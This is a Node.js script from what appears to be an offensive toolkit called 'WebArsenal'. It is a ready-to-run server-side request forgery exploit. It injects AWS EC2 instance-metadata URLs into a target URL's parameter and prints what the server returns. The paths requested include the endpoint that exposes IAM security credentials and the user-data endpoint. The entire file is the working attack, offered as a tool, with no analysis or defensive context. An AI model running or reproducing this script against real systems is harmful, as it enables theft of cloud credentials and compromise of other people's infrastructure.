#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: ec2-instance-meta.js                                ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('ec2-instance-meta.js')
  .description('Dumps AWS EC2 IMDSv1/v2 metadata when accessible via SSRF.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?url=test)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .parse(process.argv);

const opts = program.opts();

const IMDS_PATHS = [
  "latest/meta-data/",
  "latest/meta-data/iam/security-credentials/",
  "latest/meta-data/public-hostname",
  "latest/meta-data/instance-id",
  "latest/user-data/",
  "latest/dynamic/instance-identity/document"
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'ec2-instance-meta.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const param = opts.param || Array.from(targetUrl.searchParams.keys())[0];
  
  if (!param) {
    console.log(chalk.yellow('[!] No parameter provided. Use -u <url?file=test>'));
    return;
  }
  
  const baseUrl = "http://169.254.169.254/";
  console.log(chalk.cyan(`[*] Dumping EC2 IMDS for parameter: ${param}\n`));
  
  for (const path of IMDS_PATHS) {
    const payload = baseUrl + path;
    const testUrl = new URL(targetUrl.href);
    testUrl.searchParams.set(param, payload);
    
    process.stdout.write(chalk.gray(`[*] Path: ${path}... `));
    
    try {
      const res = await axios.get(testUrl.href, { timeout: 10000, validateStatus: () => true });
      const body = String(res.data);
      
      if (res.status === 200 && body.length > 0) {
        console.log(chalk.bold.green(`VULNERABLE (Data Found!)`));
        console.log(chalk.green(`    Discovery: Data preview:`));
        console.log(chalk.gray(body.substring(0, 500)));
      } else {
         console.log(chalk.red(`NOT FOUND/ACCESS DENIED`));
      }
    } catch (e) {
      console.log(chalk.red(`ERROR: ${e.message}`));
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
